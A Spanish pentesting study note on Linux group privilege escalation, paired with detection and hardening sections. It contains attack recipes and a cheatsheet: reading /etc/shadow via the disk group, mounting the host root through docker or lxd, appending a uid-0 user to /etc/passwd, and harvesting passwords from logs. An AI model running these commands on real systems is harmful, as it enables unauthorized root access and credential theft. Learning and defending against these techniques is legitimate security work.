---
tags:
  - ciberseguridad
  - escalada
  - grupos-privilegios
tipo: concepto
estado: terminado
---

# Grupos de Linux y Escalada de Privilegios

En el contexto de Linux, los **grupos** se utilizan para **organizar** a los usuarios y **asignar permisos** para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema. Para un atacante, la pertenencia a un grupo **es un privilegio explotable**: `id` es de los primeros comandos de la enumeración porque un solo grupo inesperado (`disk`, `docker`, `adm`, `shadow`) separa una shell low-priv de root.

> [!info] Gestión de Grupos en Linux
> Los comandos principales para la gestión de grupos incluyen:
> *   `groupadd [nombre_grupo]`: Crea un nuevo grupo.
> *   `groupdel [nombre_grupo]`: Elimina un nuevo grupo.
> *   `usermod -aG [nombre_grupo] [nombre_usuario]`: Añade un usuario a un grupo secundario.
> *   `groups [nombre_usuario]`: Muestra los grupos a los que pertenece un usuario.
> *   `id [nombre_usuario]`: Muestra el UID, GID y grupos a los que pertenece un usuario.
> *   `/etc/group`: Archivo que almacena la información de los grupos del sistema.

## Mecánica: cómo se decide tu grupo efectivo

| Archivo | Formato | Papel en la autorización |
|---|---|---|
| `/etc/group` | `grupo:x:gid:usuarios,separados` | define GID y membresías |
| `/etc/gshadow` | `grupo:!::` (hashes de passwords de grupo) | passwords de `newgrp` |
| `/etc/passwd` | `user:x:uid:gid:gecos:home:shell` | el **cuarto campo** es el **GID primario** |
| `/proc/self/status` | `Gid:` (real/effective/fs) | qué grupo vale en cada momento |

Reglas de evaluación (análogas a DAC):

1. **GID primario** (de `/etc/passwd`): siempre activo, sin comprobación de membresía.
2. **Grupos suplementarios**: activos si aparecen en `groups`/`id`; **max 16** (NGROUPS_MAX tradicional).
3. Root (`EUID=0`) salta el DAC… pero **ciertas operaciones exigen además el grupo** (p. ej. leer `/etc/shadow` exige root **o** grupo `shadow` porque el FS respalda permisos del archivo: `640 root:shadow`).

```bash
id                          # uid=… gid=… groups=… ← TU superficie de grupos
# salida típica: uid=1000(user) gid=1000(user) groups=1000(user),27(sudo),999(docker)
cat /etc/group | grep -v ':*$'          # grupos con miembros
getent group disk docker adm shadow     # quién está en un grupo concreto
```

> [!tip] GID primario ≠ suplementario
> Algunos sistemas te dejan **entrar** a un grupo primario con `newgrp` sin password si ya eres miembro; los suplementarios se activan al login. Para explotación da igual: lo que cuenta es `id` al momento de la shell.

## Catálogo: grupos explotables (tabla maestra)

| Grupo | Qué permite | Comando de explotación | Resultado |
|---|---|---|---|
| **`root`** (gid 0) | pertenencia al grupo raíz | ya eres "root de grupo": editar archivos `root:root` con `g+w` | root según permisos |
| **`sudo`/`wheel`/`admin`** | ejecutar todo vía sudo | `sudo -i` | **root directo** |
| **`disk`** | leer/escribir **dispositivos de bloque** crudos | `dd if=/dev/sda1 …` → extraer `shadow`/claves | **root** (ver receta) |
| **`docker`** | API del daemon Docker | `docker run -v /:/mnt …` | **root** (nota Docker) |
| **`lxd`/`lxc`** | crear contenedores de sistema | importar imagen + montar `/` host | **root** (receta abajo) |
| **`shadow`** | leer `/etc/shadow` (`640 root:shadow`) | `cat /etc/shadow` → crackear hashes | root si hay hash crackeable |
| **`adm`** | leer logs de `/var/log` (`root:adm`) | `cat /var/log/auth.log` → passwords en claro, tokens, comandos | info → escalada |
| **`crontab`** | gestionar crontabs de usuarios | escribir en `/var/spool/cron/crontabs/` | root si puedes escribir el de root (depende de FS perms) |
| **`mail`** (`gid 8`) | leer `/var/mail/*` | `cat /var/mail/root` → creds filtradas | info → escalada |
| **`staff`** | `g+w` en `/usr/local/sbin`, `/usr/local/bin` en algunas distros | plantar binario que root ejecuta por PATH | **root** |
| **`kvm`** | acceso a `/dev/kvm` | VMs del host: montar sus discos, extraer secrets | root/hipervisor |
| **`www-data`/`www`** | files de la web | webshell, creds de DB | lateral/escalada |
| **`users`** | home compartido a veces | leer otros homes | info |
| **`utmp`/`syslog`** | logs/estado | manipular logs o leer | obfuscación/leak |

### Receta `disk` → root

```bash
id    # groups=…,27(disk)…
ls -la /dev/sd*                 # discos crudos visibles
# Extraer el shadow directamente del sistema de archivos montado en crudo:
debugfs -R "cat /etc/shadow" /dev/sda1 2>/dev/null
# o copiar la partición y analizarla fuera:
dd if=/dev/sda1 of=/tmp/disk.img bs=4096 conv=noerror,sync status=progress
# montar la copia (loop) y leer:
fdisk -l /tmp/disk.img          # offset de la partición
mkdir /tmp/m && mount -o loop,offset=<bytes> /tmp/disk.img /tmp/m
cat /tmp/m/etc/shadow; ls -la /tmp/m/root/.ssh/
```

También vale: leer `/etc/shadow` del host, o copiar `/root/.ssh/id_rsa` desde la imagen montada. **`disk` es root equivalente en la práctica.**

### Receta `lxd`/`lxc` → root

```bash
# 1. Importar una imagen Alpine (privada) en el local del usuario
lxc image import https://…/alpine-*.tar.xz --alias alpine
lxc init alpine c1 -c security.privileged=true -c security.nesting=true
# 2. Montar el FS raíz del host
lxc config device add c1 hostfs disk source=/ path=/mnt
lxc exec c1 -- /bin/sh
# 3. Dentro del contenedor (con /mnt = raíz del host):
echo '…' >> /mnt/etc/shadow        # o plantar authorized_keys en /mnt/root/.ssh
```

> [!info] ¿Qué son LXD y Docker?
> *   **LXD**: es un gestor de contenedores de sistema (*system containers*) que ofrece una experiencia similar a la de una máquina virtual, pero con la ligereza de los contenedores. Permite a los usuarios ejecutar sistemas operativos completos dentro de contenedores.
> *   **Docker**: es una plataforma de contenedores de aplicaciones (*application containers*) que permite empaquetar una aplicación y todas sus dependencias en un contenedor aislado.
>
> La diferencia clave para privesc: LXD corre como **daemon del sistema** y sus imágenes montan FS arbitrarios; ambos grupos (`lxd`, `docker`) son **root equivalente**.

### Receta grupo `docker` → root

> [!warning] Riesgo de Escalada de Privilegios con Docker
> Un usuario en el grupo `docker` tiene efectivamente privilegios de `root` sobre el sistema host. Esto se debe a que puede ejecutar contenedores con la opción `--privileged` o montar el sistema de archivos raíz del host (`/`) dentro del contenedor.
>
> **Ejemplo de Escalada de Privilegios con Docker:**
> ```bash
> # 1. Montar el sistema de archivos raíz del host en un contenedor
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # Una vez dentro del contenedor, se tiene acceso de root al sistema de archivos del host.
> # Por ejemplo, se puede leer /etc/shadow o añadir un usuario con privilegios.
> # Ejemplo: Añadir una clave SSH a un usuario existente o crear un nuevo usuario.
> # chroot /mnt sh -c "echo 'newuser:password' | chpasswd"
> # chroot /mnt sh -c "usermod -aG sudo newuser"
> ```
> Este método permite al atacante manipular archivos críticos del sistema host, como `/etc/shadow`, `/etc/passwd`, o incluso inyectar claves SSH en el directorio `~/.ssh` de un usuario privilegiado.

El detalle completo (socket, `--privileged`, escape de contenedor) está en [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]].

### Lectura de logs con `adm` (puente de info a root)

```bash
# Debian/Ubuntu:
ls /var/log/                          # auth.log, syslog, dpkg.log…
grep -h -iE 'pass|BEGIN RSA|token' /var/log/auth.log* | head -50
# RHEL/CentOS (grupo adm):
grep -h 'COMMAND=' /var/log/secure
# Contraseñas en claro que se colaron por: comandos con echo, instalaciones,
# respuestas a prompts interactivos, tokens en variables de entorno de services.
```

Una password de root en claro en `auth.log` (error de sudo con contraseña tecleada en comando) es el camino más corto: `su -` y listo.

## Escritura en `/etc/passwd` (técnica de archivo, no de grupo)

Suele aparecer junto a la revisión de grupos porque `/etc/passwd` es `664 root:root` en instalaciones antiguas o por reglas ACL rotas — y **escribir ahí equivale a root** sin tocar `shadow`:

```bash
# 1) Añadir usuario uid 0 con hash conocido (openssl genera el hash):
openssl passwd P@ss123
# línea:  pwn:$6$…hash…:0:0:pwn:/root:/bin/bash
echo 'pwn:$6$xyz$…:0:0:pwn:/root:/bin/bash' >> /etc/passwd
su pwn     # contraseña P@ss123 → uid=0

# 2) Vaciar el campo de password del usuario actual (sin hash):
#    user:x:1000:1000::/home/user:/bin/bash   →   user::1000:1000::/home/user:/bin/bash
passwd -d $USER; su $USER     # según config, puede entrar sin pass
```

Comprobación de la superficie: `ls -la /etc/passwd /etc/shadow /etc/sudoers` + `test -w /etc/passwd && echo ESCRIBIBLE` + revisar ACL (`getfacl /etc/passwd`).

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| Usuario añadido a grupo sensible | `ausearch -k group_write` (auditd sobre `/etc/group`); diff diario de `getent group` |
| Nuevo miembro de `sudo`/`docker` | alerta en FIM sobre `/etc/sudoers.d`, `usermod -aG sudo` en shell history |
| Lectura de `/etc/shadow` por no-root | `auditctl -w /etc/shadow -p r -k shadow_read` |
| Limpieza de logs por usuario `adm` | truncado/`shred` de `/var/log/auth.log*` → alerta de integridad |
| Imagen LXD/Docker creada por usuario no-admin | `lxc list`, `docker ps -a` fuera de inventario |
| Línea extra en `/etc/passwd` con uid 0 | FIM sobre `/etc/passwd` (AIDE/Tripwire) |

## Impacto

- **Root directo**: `sudo`, `docker`, `lxd`, `disk`, escritura en `/etc/passwd`, `staff`+PATH.
- **Root condicionado**: `shadow` (necesita crack), `mail`/`adm` (necesita una cred filtrada en los artefactos).
- **Movimiento lateral**: `www-data`, `crontab`, `kvm` — acceso a otros contextos que después escalan.

## Sección defensiva: mitigación

> [!info] Otros Grupos de Riesgo
> Además de `docker` y `lxd`, otros grupos como `kvm` (Kernel-based Virtual Machine) o `disk` también pueden presentar riesgos de seguridad si se asignan a usuarios no confiables, ya que permiten acceso directo a recursos de hardware o dispositivos de bloque. La gestión de permisos y la auditoría de la pertenencia a grupos son cruciales para mantener la seguridad del sistema.

```bash
# 1. Auditar quién está en grupos de riesgo
for g in sudo wheel admin docker lxd disk shadow adm kvm crontab staff mail; do
  echo "== $g"; getent group $g
done

# 2. Reglas duras en el kernel: prohibir hardlink/symlink abusados
sysctl -w fs.protected_hardlinks=1
sysctl -w fs.protected_symlinks=1

# 3. Permisos de archivos sensibles correctos
chmod 640 /etc/shadow; chgrp shadow /etc/shadow
chmod 644 /etc/passwd /etc/group
chmod 750 /var/log; chown root:adm /var/log

# 4. No otorgar grupos "por comodidad"
#    Mal:  usermod -aG sudo,docker deploy
#    Bien: sudoers concreto para la tarea puntual (nota Sudoers)

# 5. Retirar membresías ya innecesarias
gpasswd -d usuario docker

# 6. Monitoreo continuo
auditctl -w /etc/group -p wa -k group_write
auditctl -w /etc/passwd -p wa -k passwd_write
```

Regla operativa: **cada grupo de riesgo debe justificarse por escrito**; la membresía se revisa igual que una clave SSH: se otorga lo mínimo y se retira cuando cambia el rol.

## Errores comunes

1. **Mirar solo `whoami`** — los grupos suplementarios no aparecen ahí; `id` o `groups` son la fuente de verdad.
2. **Creer que `disk` solo da "lectura de discos"** — con `dd`/`debugfs` en crudo es escritura completa al FS: root equivalente.
3. **Confundir `adm` con permisos de administración** — no da sudo; solo lectura de logs (pero es info de alto valor).
4. **Probar `docker ps` sin verificar el socket** — si el grupo está pero el daemon caído/permisos 660 sin root, `docker` falla; revisar `ls -la /var/run/docker.sock`.
5. **Olvidar el grupo primario**: en algunas configs el usuario pertenece a `staff` (gid 1000 heredado) — revisar el GID primario en `id`.
6. **Asumir que `/etc/passwd` escriturable es raro** — aparece en instalaciones con herramientas de provisioning mal ejecutadas; siempre `test -w`.
7. **False positive con `newgrp`**: entrar a un grupo donde no eres miembro pide password de *grupo* (gshadow) — no es un vector si no la tienes.

## Cheatsheet

```bash
# Enumeración
id; groups; cat /etc/group | grep -v ':\*$'
getent group sudo docker disk shadow adm lxd
test -w /etc/passwd && echo ESCRIBIBLE
ls -la /etc/shadow /var/log/auth.log /var/run/docker.sock

# Explotaciones por grupo
sudo -i                                     # sudo/wheel
docker run -v /:/mnt --rm -it alpine chroot /mnt sh     # docker
dd if=/dev/sda1 of=/tmp/d.img bs=4096       # disk → mount loop → shadow
cat /etc/shadow                             # shadow
grep -i pass /var/log/auth.log              # adm
# lxd: import imagen → init privileged → device add disk source=/ → editar /mnt/etc/*

# /etc/passwd
openssl passwd P@ss123   #  añadir línea uid 0 → su pwn

# Hardening
gpasswd -d user docker; chmod 640 /etc/shadow
auditctl -w /etc/group -p wa -k group_write
```

## Referencias

- HackTricks — Linux privilege escalation (groups): https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation.html
- HackTricks — Docker & LXD escape: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security.html
- GTFOBins: https://gtfobins.github.io/
- Notas internas: [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]], [[Abuso de Permisos en Linux y LSE]], [[Abuso de Privilegios Sudoers]], [[Lectura de Permisos]], [[Detección y Explotación de Tareas Cron]]

## Relacionadas

- [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]] — el grupo `docker` en profundidad
- [[Abuso de Permisos en Linux y LSE]] — `id` como paso de triage P1
- [[Abuso de Privilegios Sudoers]] — qué hacer si el grupo es `sudo`
- [[Lectura de Permisos]] — permisos de `shadow`, `passwd`, `group`
- [[Detección y Explotación de Tareas Cron]] — grupo `crontab`
- [[Privilegios SUID en Linux]] — vía alternativa cuando los grupos no dan resultado
